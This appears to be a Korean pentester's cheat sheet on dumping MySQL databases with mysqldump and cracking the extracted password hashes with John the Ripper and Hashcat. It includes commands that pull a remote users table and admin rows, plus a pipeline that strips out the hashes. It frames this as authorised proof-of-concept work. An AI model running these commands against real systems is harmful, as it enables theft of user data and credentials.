
# MySQL DB 덤핑, 해시 크래킹

## 덤핑 개념
- **MySQL 덤핑**은 데이터베이스의 데이터를 백업하거나 외부로 추출하기 위해 사용하는 방식입니다.
- `mysqldump` 명령어를 사용하면 데이터베이스의 구조와 데이터를 SQL 형식으로 내보낼 수 있습니다.
- 침해 사례에서는 공격자가 DB 접근 권한을 얻은 후 중요한 데이터를 빼돌리는 데 사용됩니다.

## 주의사항
- DB 덤핑 및 추출은 항상 개념 증명용
  - 완전 덤핑 시 사전 허락 필수

## 추가 정보
- MySQL 사용하는 다른 네트워크 서비스 설정 파일 속 계정 정보

## DB 덤핑 (Dumping)

`mysqldump -u root -p'<비밀번호>' -P <포트> -h <ip> <db> <table>`
`mysqldump -u root -p'<비밀번호>' -P <포트> -h <ip> production users > users.sql.dump`
- production DB명의 users 테이블을 users.sql.dump 파일에 저장
`mysqldump -u root -p'<비밀번호>' -P <포트> -h <ip> <db> <table> --where="username LIKE '%admin%'"`
- production DB명의 users 테이블의 username 컬럼의 admin 이 포함된 데이터를 추출

```
cat users.sql.dump | grep -i 'INSERT INTO `users`' -A 26 | tr -d "'" | cut -d ',' -f 3 | tr -d ')' | tr -d ';' > mysql.hash
```
- 추출된 정보는 `cat`으로 확인 가능하며 비밀번호(HASH)값만 mysql.hash 해시 파일으로 저장


## 해시 크래킹 

### John the Ripper
- `john --wordlist=<사전파일> <해시파일>`
- **예시
  - `john --wordlist=/usr/share/wordlists/rockyou.txt mysql.hash`
  - `john --wordlist=/usr/share/wordlists/rockyou.txt mysql.hash --format=Raw-MD5 --pot=john.output`
   - `cat john.output`

### Hashcat
- `hashcat -m <모드> -a 0 <해시파일> <사전파일>`
